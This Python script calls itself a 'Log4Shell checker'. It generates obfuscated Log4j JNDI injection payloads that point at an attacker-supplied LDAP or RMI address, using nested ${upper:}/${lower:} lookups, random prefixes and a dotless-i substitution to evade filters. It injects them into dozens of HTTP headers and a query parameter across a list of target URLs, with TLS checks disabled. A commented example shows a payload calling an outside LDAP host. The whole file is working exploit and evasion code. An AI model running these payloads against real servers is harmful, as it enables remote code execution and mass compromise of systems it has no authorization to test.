import requests, sys, subprocess, argparse, string, random, locale
import urllib3
urllib3.disable_warnings()

def init():
    usage = '''Example: log4j-checker.py <[-u 127.0.0.1],[-l listurl.txt]> -a rmi://127.0.0.1:4444/a
    log4j-checker.py 127.0.0.1 ldap://127.0.0.1:4444/a
    log4j-checker.py 127.0.0.1 rmi://domain.dns.log/a
    log4j-checker.py 127.0.0.1 ldap://domain.dns.log/a
    '''

    parser = argparse.ArgumentParser(description='Log4Shell checker', usage=usage)
    parser.add_argument('-u', '--url', help='URL to check')
    parser.add_argument('-l', '--list', help='list URL to check')
    parser.add_argument('-a', '--address', help='JNDI address')
    parser.add_argument('-p', '--proxy', help='Enable proxy')
    args = parser.parse_args()
    if (not args.url and not args.list) or not args.address:
        parser.print_usage()
        exit(1)
    return args


def send_requests(url, payload, proxy):
    proxies = None
    if proxy:
        proxies = {
            'http': 'http://%s' %(proxy),
            'https': 'http://%s' %(proxy)
        }

    headers = {
        "User-Agent": payload,
        "Referer": payload,
        "Authentication": payload,
        'upgrade-insecure-requests': payload,
        'accept': payload,
        'accept-encoding': payload,
        'accept-language': payload,
        'Content-Type': payload,
        'Cache-Control': payload,
        "Authenzion": payload,
        "Origin": payload,
        "Cookie": payload,
        "Authorization": payload,
        "Cf-Connecting_ip": payload,
        "Client-Ip": payload,
        "Forwarded-For-Ip": payload,
        "Forwarded-For": payload,
        "Forwarded": payload,
        "If-Modified-Since": payload,
        "Originating-Ip": payload,
        "True-Client-Ip": payload,
        "X-Api-Version": payload,
        "X-Client-Ip": payload,
        "X-Forwarded-For": payload,
        "X-Leakix": payload,
        "X-Originating-Ip": payload,
        "X-Real-Ip": payload,
        "X-Remote-Addr": payload,
        "X-Remote-Ip": payload,
        "X-Wap-Profile": payload,
    }
    try:
        resp = requests.get("%s/?cm0s=%s" %(url, payload), headers=headers, verify=False, proxies=proxies, timeout=10)
        # print(resp.text)
    except Exception as e:
        print(e)
        pass

def check_log4j(url, payloads, proxy):
    print('---------------------------------------------------------')
    print('[+] Check: %s' %(url))
    print('---------------------------------------------------------')
    for payload in payloads:
        print('----> Send payload: %s' %(payload))
        payloadtmp = ''
        for c in payload:
            payloadtmp += '%C4%B1' if c == '\u0131' else c
        payload = payloadtmp
        send_requests(url, payload, proxy)

class Obfuscator:
    def getRandomString(self, length):
        str = string.ascii_letters
        result = ''
        for i in range(length):
            result += str[random.randint(0,len(str)-1)]
        return result

    def upperChar(self, char):
        return '${upper:%s}' %(char)

    def lowerchar(self, char):
        return '${lower:%s}' %(char)

    def obfuscateUpper(self, chars, isAll=False):
        result = ''
        for i in range(len(chars)):
            char = chars[i]
            if char != '$' and char != '{' and char != '}':
                if isAll and i < 7:
                    result += self.upperChar(char)
                else:
                    if random.choice([True, False])  and i < 7:
                        result += self.upperChar(char)
                    else:
                        result += self.lowerchar(char) if random.choice([True, False]) else char
            else:
                result += char
        return result

    def obfuscateLower(self, chars, isAll=False):
        result = ''
        for char in chars:
            if char != '$' and char != '{' and char != '}':
                if isAll:
                    result += self.lowerchar(char)
                else:
                    result += self.lowerchar(char) if random.choice([True, False]) else char
            else:
                result += char
        return result

    def randomChar(self, char):
        result = ''
        for i in range(random.randint(1,5)):
            result += self.getRandomString(random.randint(1,6)) + ':'
        return '${%s-%s}' %(result, char)

    def obfuscateRandom(self, chars):
        result = ''
        for char in chars:
            if char != '$' and char != '{' and char != '}':
                result += self.randomChar(char)
            else:
                result += char
        return result
    
    def generatePayload(self, payload):
        result = []
        result.append((payload))
        result.append((self.obfuscateLower(payload, True)))
        result.append((self.obfuscateUpper(payload, True)))
        result.append((self.obfuscateRandom(payload)))
        
        payloadtmp = ''
        for i in range(len(payload)):
            if i == 5:
                payloadtmp += '\u0131'
            else:
                payloadtmp += payload[i]
        payload = payloadtmp
        result.append((self.obfuscateLower(payload, True)))
        result.append((self.obfuscateUpper(payload, True)))
        result.append((self.obfuscateRandom(payload)))
        return result

    

def main():
    args = init()
    jndi_address = args.address
    proxy = args.proxy if args.proxy else False

    # payloads = subprocess.check_output(['java', '-jar', 'CLILog4jObjuscator.jar', '%s' %(jndi_address)]).decode('ascii').split('\n')
    # payloads = list(filter(None, payloads))
    # payloads = [i.strip('\r') for i in payloads]

    obfucsator = Obfuscator()
    payloads = obfucsator.generatePayload('${jndi:%s}' %(jndi_address))

    if args.url:
        url = args.url.strip('/')
        check_log4j(url, payloads, proxy)
    elif args.list:
        with open(args.list, 'r') as fp:
            urls = fp.read().split('\n')
            urls = list(filter(None, urls))
            urls = [i.strip('\r') for i in urls]
            for url in urls:
                check_log4j(url, payloads, proxy)

if __name__ == '__main__':
    # obfucsator = Obfuscator()
    # payload = '${jndi:ldap://10.7.19.250:4444/redpoc}'
    # print(obfucsator.generatePayload(payload))
    main()